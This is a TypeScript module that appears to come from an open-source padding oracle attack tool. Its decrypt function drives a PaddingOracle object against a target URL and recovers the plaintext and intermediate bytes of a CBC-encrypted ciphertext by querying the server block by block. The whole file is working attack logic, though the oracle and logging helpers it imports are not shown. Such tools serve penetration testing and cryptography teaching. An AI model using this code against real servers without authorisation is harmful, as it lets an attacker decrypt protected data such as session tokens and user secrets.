import ow from 'ow'
import { range } from 'lodash'

import { decryption } from './logging'
import PaddingOracle from './padding-oracle'
import { DecryptOptions } from './types'
import { xor } from './util'

const { logStart, logCompletion } = decryption

async function decrypt(
  { url, blockSize, logMode = 'full', ciphertext, isDecryptionSuccess, makeInitialRequest = true, alreadyFound, startFromFirstBlock, initFirstPayloadBlockWithOrigBytes, ...args }:
  DecryptOptions
) {
  ow(ciphertext, ow.buffer)
  ow(alreadyFound, ow.optional.buffer)
  if (ciphertext.length % blockSize !== 0) throw TypeError('Invalid `ciphertext`, should be evenly divisble by `blockSize`')

  const totalSize = ciphertext.length
  const blockCount = totalSize / blockSize

  const foundBytes = Buffer.alloc(totalSize - blockSize) // plaintext bytes
  const interBytes = Buffer.alloc(totalSize - blockSize)
  const foundOffsets: Set<number> = new Set()

  if (alreadyFound && alreadyFound.length) {
    const startIndex = foundBytes.length - alreadyFound.length
    const lastBytes = ciphertext.slice(startIndex)
    const interFound = xor(alreadyFound, lastBytes)
    alreadyFound.copy(foundBytes, startIndex)
    interFound.copy(interBytes, startIndex)
    for (const offset of range(startIndex, foundBytes.length)) foundOffsets.add(offset)
  }

  const origBytes = ciphertext
  const plaintext = foundBytes
  const po = PaddingOracle({
    origBytes,
    ciphertext,
    plaintext,
    foundBytes,
    interBytes,
    foundOffsets,
    blockSize,
    blockCount,
    url,
    isDecryptionSuccess,
    startFromFirstBlock,
    initFirstPayloadBlockWithOrigBytes,
    logMode,
    ...args
  })
  const initialRequest = makeInitialRequest ? po.callOracle(ciphertext) : undefined
  const decryptionSuccess = initialRequest ? initialRequest.then(isDecryptionSuccess) : undefined
  if (['full', 'minimal'].includes(logMode)) await logStart({ blockCount, totalSize, initialRequest, decryptionSuccess })
  await po.processBlocks()

  if (['full', 'minimal'].includes(logMode)) logCompletion({ foundBytes, interBytes })

  return { blockCount, totalSize, foundBytes, interBytes }
}

export default decrypt
